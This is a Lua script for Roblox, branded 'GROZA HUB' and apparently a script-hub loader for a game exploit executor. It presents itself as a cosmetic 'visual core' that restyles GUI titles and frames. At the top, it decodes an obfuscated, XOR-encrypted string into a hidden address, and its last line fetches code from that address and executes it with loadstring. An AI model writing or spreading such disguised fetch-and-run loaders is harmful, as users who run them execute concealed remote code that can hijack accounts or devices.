
--[[ STAGE 2: VISUAL CORE ]]
local rkzt5a3HNMCvwhifJ9Nu="\174\191\180\181\141\065\075\064\152\132\239\083\145\232\248\225\243\253\197\192\207\217\199\208\044\039\045\035\054\245\063\008\011\194\020\108\029\105\103\124\061\006\001\018\015\103\126\120\021\173\085\083\189\126\188\190\191\183\131\092\159\128\149\239\165\230\245\247\252\192\137\195\199\209\193\209\037\228\042\059\035\056\206\009\031\008"local I4bQcw3PzOL_GC=44 local BgALneNnWcPNjsroYwfk=14 local UcXIPAKkhLfX3mgv=1 local fZVt3CZMLudb0wNE2NNh=5 local LqxEoGKDLmgUAhRKQ3=7 local oluARt4RvLlfid=false local SQSVTQbMt_s1JmY9=bit32 and bit32.bxor if not SQSVTQbMt_s1JmY9 then SQSVTQbMt_s1JmY9=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local NtP8adlzvri9UwM={}for I9JZnRlkkOnKBal36=1,#rkzt5a3HNMCvwhifJ9Nu do local jV06aHc6i0dWx7hmwABM=string.byte(rkzt5a3HNMCvwhifJ9Nu,I9JZnRlkkOnKBal36)local AHNV2JnSeSh6zs=(BgALneNnWcPNjsroYwfk+(I9JZnRlkkOnKBal36*fZVt3CZMLudb0wNE2NNh)+LqxEoGKDLmgUAhRKQ3)%256 if UcXIPAKkhLfX3mgv==0 then jV06aHc6i0dWx7hmwABM=(jV06aHc6i0dWx7hmwABM-AHNV2JnSeSh6zs)%256 NtP8adlzvri9UwM[I9JZnRlkkOnKBal36]=string.char(SQSVTQbMt_s1JmY9(jV06aHc6i0dWx7hmwABM,I4bQcw3PzOL_GC))else jV06aHc6i0dWx7hmwABM=SQSVTQbMt_s1JmY9(jV06aHc6i0dWx7hmwABM,I4bQcw3PzOL_GC)NtP8adlzvri9UwM[I9JZnRlkkOnKBal36]=string.char((jV06aHc6i0dWx7hmwABM-AHNV2JnSeSh6zs)%256)end end local xUlJ9bcQ0ErwHMtR0f=table.concat(NtP8adlzvri9UwM)if oluARt4RvLlfid then xUlJ9bcQ0ErwHMtR0f=string.reverse(xUlJ9bcQ0ErwHMtR0f)end local rkZV9H2Za1IR3fjuhmFYng=xUlJ9bcQ0ErwHMtR0f
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(rkZV9H2Za1IR3fjuhmFYng))()
